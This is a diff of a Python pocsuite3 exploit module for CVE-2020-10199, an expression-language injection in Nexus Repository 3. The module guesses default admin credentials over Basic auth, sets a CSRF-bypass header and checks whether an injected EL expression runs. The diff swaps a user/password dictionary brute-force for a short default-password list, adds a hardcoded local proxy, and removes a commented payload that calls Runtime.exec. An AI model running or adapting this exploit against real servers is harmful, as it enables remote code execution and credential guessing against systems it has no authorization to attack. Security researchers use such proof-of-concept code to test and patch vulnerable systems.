@@ -4,17 +4,16 @@
 import random
 import json
 import base64
-
-# 为了拿到password-top100.txt
-from pocsuite3.lib.core.data import paths
+import traceback
 
 from pocsuite3.api import requests as req
 from pocsuite3.api import register_poc
-from pocsuite3.api import Output, POCBase, logger
+from pocsuite3.api import Output, POCBase
 from pocsuite3.api import POC_CATEGORY, VUL_TYPE
 
 '''
 CVE-2020-10199: Nexus 3 EL injection
+Admin access is required
 '''
 class Nexus3_2020_10199_EL_INJECTION_POC(POCBase):
     vulID = 'Nexus3-CVE-2020-10199'
@@ -38,6 +37,10 @@ class Nexus3_2020_10199_EL_INJECTION_POC(POCBase):
     ran2 = random.randint(100,200)
     
     ran_sum = ran1 * ran2
+
+    http_proxy  = "http://192.168.85.1:8087"
+    https_proxy = "http://192.168.85.1:8087"
+    proxies = {"http": http_proxy, "https": https_proxy}
 
     h = {"NX-ANTI-CSRF-TOKEN": "test", "Cookie": "NX-ANTI-CSRF-TOKEN=test"}    # 用于通过Nexus的CSRF验证
 
@@ -76,58 +79,46 @@ class Nexus3_2020_10199_EL_INJECTION_POC(POCBase):
             
             try:
                 # 发起payload请求
-                resp = req.post(target_url, json=j, headers=self.headers)#, proxies={'http': 'http://127.0.0.1:8087'})
+                resp = req.post(target_url, json=j, headers=self.headers, proxies=self.proxies)
 
                 if self.test_EL(resp):   # 验证响应中json的相应字段是否已经执行了EL表达式
                     result['VerifyInfo'] = {}
                     result['VerifyInfo']['URL'] = target_url
-                    result['VerifyInfo']['Credentials'] = auth_header
                     return self.save_output(result)
                 return self.save_output(result)
             except json.decoder.JSONDecodeError as e:
                 if resp.status_code == 401:
-                    pass
-                    #print("认证失败")
+                    print("认证失败")
                 else:
-                    logger.info("json解析失败")
+                    print("json解析失败")
                 # 失败了可能只是密码错误，继续下一个密码尝试
                 continue
             except Exception as e:
-                logger.error(e)
-                raise e
+                print(e)
+                traceback.print_stack()
 
 
 
     def get_auth_headers(self):
-        #user = "admin"
-        users = ['nexus', 'test', 'root', 'nexus3', 'admin', 'user', 'administrator']
-        #passwords = ["admin", "admin123"]    # 可以在此添加多个密码
-        passwords = self.get_password_dict()
-
+        user = "admin"
+        passwords = ["admin", "admin123"]    # 可以在此添加多个密码
         _l_auth_headers = []
-        for user in users:
-            for password in passwords:
-                tmp = user + ':' + password
-                auth = base64.b64encode(tmp.encode('ascii')).decode("utf-8")
-                headers = {'Authorization': 'Basic'+' '+auth}
-                _l_auth_headers.append(headers)
+        for password in passwords:
+            tmp = user + ':' + password
+            auth = base64.b64encode(tmp.encode('ascii')).decode("utf-8")
+            headers = {'Authorization': 'Basic'+' '+auth}
+            _l_auth_headers.append(headers)
         
         return _l_auth_headers
 
-
-    def get_password_dict(self):
-        f = open(paths.WEAK_PASS)
-        pwddict = []
-        for item in f.readlines():
-            pwddict.append(item.strip())
-        return pwddict
 
 
     # 验证EL表达式被执行
     def test_EL(self, p_resp):
         d = p_resp.json()
         result = d[0]['message']
-        logger.info(result)
+        print(result)
+        print(self.ran_sum)
         try:
             if str(self.ran_sum) in result:
                 return True
@@ -137,11 +128,7 @@ class Nexus3_2020_10199_EL_INJECTION_POC(POCBase):
 
     # 攻击模块
     def _attack(self):
-        #'''
-        { "name": "internal", "online": "true", "storage": { "blobStoreName": "default", "strictContentTypeValidation": "true" }, "group": { "memberNames": [ "$\\A{''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(''.getClass().forName('java.lang.Runtime')).exec('calc')}" ] } }
-        '''
         return self._verify()
-        
 
     # 输出报告
     def save_output(self, result):
